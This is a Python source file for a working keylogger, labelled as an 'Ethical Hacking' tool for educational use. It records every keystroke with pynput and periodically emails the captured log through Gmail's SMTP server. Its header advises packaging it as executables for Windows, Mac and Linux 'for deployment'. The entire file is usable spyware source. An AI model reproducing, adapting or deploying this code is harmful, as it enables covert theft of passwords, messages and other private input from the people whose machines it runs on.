#!/usr/bin/python
import pynput.keyboard
import smtplib
import threading

'''
Description: This tool is part of the Ethical Hacking toolset. This is for educational use ONLY for security purposes.
The keylogger takes the all key strikes on keyboard and send them to an email every specific period of time
Requirements: You need only to install pynput
          		'pip install pynput'
          		Use packaged executables for Mac OS, Linux and MS Windows for deployment
Usage: python keylogger.py  or better for deployment to chnage source code and package the app as executables
Enjoy!
'''


class Keylogger:

	def __init__(self, time_interval, email, password):
		#constructor
		self.logger = "[Keylogger Initiated]"
		self.subject = "Keylogger Report Email"
		self.email = email
		self.password = password
		self.interval = time_interval
	

	def append_to_log(self, key_strike):
		self.logger = self.logger + key_strike

	def evaluate_keys(self, key):
		try: 
			# This will not throw exceptions when encountering a special character
			Pressed_key = str(key.char)
		except AttributeError:
			# The case is for encountering a special character (space, tab, ctrl, Enter etc...)
			#TODO: include as many if as need to remove unwanted special characters
			if key == key.space:	# Show actual space instead of key.space
				Pressed_key =  " "
			else:
				Pressed_key =  " " + str(key) + " "

		#Now appending the key pressed		
		self.append_to_log(Pressed_key)


	def report(self):
		#print(self.logger)
		#sending the email of what has been logged
		self.send_mail(self.email, self.password, self.subject, self.logger)
		self.logger = ""
		timer = threading.Timer(self.interval, self.report)
		timer.start()


	def send_mail(self, email, password, subject, message):
		Email_message = 'Subject: {}\n\n{}'.format(subject, message)
		server = smtplib.SMTP("smtp.gmail.com", 587)
		server.starttls()
		server.login(email, password)
		server.sendmail(email, email, Email_message)
		server.quit()	

	def start(self):
		keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
		with keyboard_listener:
			self.report()
			keyboard_listener.join()


